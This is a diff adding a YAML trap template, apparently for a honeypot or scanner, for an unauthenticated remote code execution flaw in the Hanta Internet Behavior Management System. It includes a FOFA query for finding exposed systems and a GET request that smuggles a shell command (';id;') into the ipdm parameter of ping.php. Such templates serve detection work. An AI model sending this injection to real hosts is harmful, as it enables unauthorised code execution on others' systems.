@@ -1,0 +1,21 @@
+id: hanta-rce
+info:
+  name: Hanta Internet Behavior Management System - Remote Code Execution
+  author: momika233
+  description: Hanta Internet Behavior Management System is vulnerable to RCE.
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="汉塔科技上网行为管理系统"
+  tags: hanta,rce,unauth
+traps:
+- request:
+    method: GET
+    path: /dgn/dgn_tools/ping.php?ipdm=2;id;
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
